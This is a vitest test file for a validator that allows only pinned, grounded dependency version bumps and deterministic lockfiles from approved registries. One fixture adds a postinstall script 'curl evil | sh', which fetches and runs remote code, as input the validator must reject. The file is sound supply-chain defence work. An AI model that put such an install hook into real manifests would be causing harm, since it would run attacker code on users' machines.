import { describe, expect, it } from 'vitest';

import {
  APPROVED_REGISTRY_ORIGINS,
  dependencyResolutionInput,
  validateDependencyManifestChange,
  validateGeneratedLockfile,
} from './dependency-transaction.js';

const grounding = {
  packageName: 'left-pad',
  version: '1.3.0',
  evidenceReferences: ['https://example.invalid/releases/left-pad-1.3.0'],
};

function manifest(extra: Record<string, unknown> = {}, deps: Record<string, string> = { 'left-pad': '1.2.0' }): string {
  return JSON.stringify({ name: 'fixture', version: '0.0.0', dependencies: deps, ...extra });
}

const baseline = manifest();
const bumped = manifest({}, { 'left-pad': '1.3.0' });

describe('dependency manifest change', () => {
  it('accepts the exact grounded version bump of an existing dependency', () => {
    expect(validateDependencyManifestChange(baseline, bumped, grounding)).toEqual({
      section: 'dependencies',
      packageName: 'left-pad',
      fromVersion: '1.2.0',
      toVersion: '1.3.0',
    });
  });

  it('accepts the bump in any supported dependency section', () => {
    const before = JSON.stringify({ name: 'f', devDependencies: { 'left-pad': '1.2.0' } });
    const after = JSON.stringify({ name: 'f', devDependencies: { 'left-pad': '1.3.0' } });

    expect(validateDependencyManifestChange(before, after, grounding).section).toBe('devDependencies');
  });

  it('refuses a change outside the dependency sections', () => {
    const withScript = manifest({ scripts: { postinstall: 'curl evil | sh' } }, { 'left-pad': '1.3.0' });

    expect(() => validateDependencyManifestChange(baseline, withScript, grounding))
      .toThrow(/only dependency versions may change/u);
  });

  it('refuses a registry or package-manager override riding along', () => {
    const withRegistry = manifest(
      { publishConfig: { registry: 'https://registry.invalid/' } }, { 'left-pad': '1.3.0' },
    );
    const withManager = manifest({ packageManager: 'pnpm@1.0.0' }, { 'left-pad': '1.3.0' });

    expect(() => validateDependencyManifestChange(baseline, withRegistry, grounding))
      .toThrow(/only dependency versions may change/u);
    expect(() => validateDependencyManifestChange(baseline, withManager, grounding))
      .toThrow(/only dependency versions may change/u);
  });

  it.each([
    ['a caret range', '^1.3.0'],
    ['a tilde range', '~1.3.0'],
    ['a dist tag', 'latest'],
    ['a wildcard', '*'],
    ['a local path', 'file:../left-pad'],
    ['a tarball URL', 'https://example.invalid/left-pad.tgz'],
    ['a git reference', 'git+ssh://git@example.invalid/left-pad.git'],
    ['an alias', 'npm:other@1.3.0'],
    ['a workspace protocol', 'workspace:*'],
  ])('refuses %s as the destination version', (_name, specifier) => {
    expect(() => validateDependencyManifestChange(
      baseline, manifest({}, { 'left-pad': specifier }), grounding,
    )).toThrow(/pinned release|grounded version/u);
  });

  it('refuses an unpinned baseline version', () => {
    expect(() => validateDependencyManifestChange(
      manifest({}, { 'left-pad': '^1.2.0' }), bumped, grounding,
    )).toThrow(/baseline left-pad is not a pinned release/u);
  });

  it('refuses adding or removing a dependency', () => {
    expect(() => validateDependencyManifestChange(
      baseline, manifest({}, { 'left-pad': '1.2.0', extra: '1.0.0' }), grounding,
    )).toThrow(/was added/u);
    expect(() => validateDependencyManifestChange(
      baseline, manifest({}, {}), grounding,
    )).toThrow(/was removed/u);
  });

  it('refuses changing more than one dependency', () => {
    const before = manifest({}, { 'left-pad': '1.2.0', other: '2.0.0' });
    const after = manifest({}, { 'left-pad': '1.3.0', other: '2.1.0' });

    expect(() => validateDependencyManifestChange(before, after, grounding))
      .toThrow(/exactly one dependency version may change/u);
  });

  it('refuses a change that does not match the grounded package or version', () => {
    const otherPackage = validateDependencyManifestChange.bind(null,
      manifest({}, { other: '1.2.0' }), manifest({}, { other: '1.3.0' }), grounding);
    const otherVersion = validateDependencyManifestChange.bind(null,
      baseline, manifest({}, { 'left-pad': '1.4.0' }), grounding);

    expect(otherPackage).toThrow(/is not the grounded package/u);
    expect(otherVersion).toThrow(/is not the grounded version/u);
  });

  it('refuses a grounded change with no citation identity', () => {
    expect(() => validateDependencyManifestChange(
      baseline, bumped, { ...grounding, evidenceReferences: [] },
    )).toThrow(/citation identity/u);
  });

  it('refuses an unchanged manifest and malformed JSON', () => {
    expect(() => validateDependencyManifestChange(baseline, baseline, grounding))
      .toThrow(/no dependency version changed/u);
    expect(() => validateDependencyManifestChange(baseline, '{oops', grounding))
      .toThrow(/not valid JSON/u);
    expect(() => validateDependencyManifestChange(baseline, '[]', grounding))
      .toThrow(/must be a JSON object/u);
  });
});

describe('dependency resolution input', () => {
  it('carries the manifest alone with scripts disabled', () => {
    const input = dependencyResolutionInput(bumped, 'corepack pnpm install --lockfile-only');

    expect(Object.keys(input.files)).toEqual(['package.json']);
    expect(input.files['package.json']).toBe(bumped);
    expect(input.scriptsDisabled).toBe(true);
  });

  it('refuses an empty preparation command', () => {
    expect(() => dependencyResolutionInput(bumped, '   ')).toThrow(/preparation command is required/u);
  });
});

describe('generated lockfile', () => {
  const lockfile = [
    "lockfileVersion: '9.0'",
    'packages:',
    '  left-pad@1.3.0:',
    '    resolution: {tarball: https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz}',
    '',
  ].join('\n');

  it('accepts a deterministic lockfile from approved origins', () => {
    const generated = validateGeneratedLockfile([lockfile, lockfile]);

    expect(generated.path).toBe('pnpm-lock.yaml');
    expect(generated.content).toBe(lockfile);
    expect(generated.sha256).toMatch(/^[a-f0-9]{64}$/u);
    expect(APPROVED_REGISTRY_ORIGINS).toContain('https://registry.npmjs.org/');
  });

  it('refuses a nondeterministic resolution', () => {
    expect(() => validateGeneratedLockfile([lockfile, `${lockfile}# drift\n`]))
      .toThrow(/was not deterministic/u);
  });

  it('refuses a single unrepeated resolution', () => {
    expect(() => validateGeneratedLockfile([lockfile]))
      .toThrow(/at least two resolution runs/u);
  });

  it('refuses a missing or empty artifact', () => {
    expect(() => validateGeneratedLockfile(['', ''])).toThrow(/produced no lockfile/u);
  });

  it('refuses an unapproved origin', () => {
    const rogue = lockfile.replace('https://registry.npmjs.org/', 'https://registry.invalid/');

    expect(() => validateGeneratedLockfile([rogue, rogue])).toThrow(/unapproved origin/u);
  });

  it('refuses a git or file origin', () => {
    const git = `${lockfile}    resolution: {repo: git+ssh://git@example.invalid/x.git}\n`;

    expect(() => validateGeneratedLockfile([git, git])).toThrow(/unapproved origin/u);
  });

  it('refuses an artifact beyond the byte bound', () => {
    const large = `${lockfile}${'#'.repeat(200)}\n`;

    expect(() => validateGeneratedLockfile([large, large], { maxBytes: 64 }))
      .toThrow(/byte artifact bound/u);
  });
});
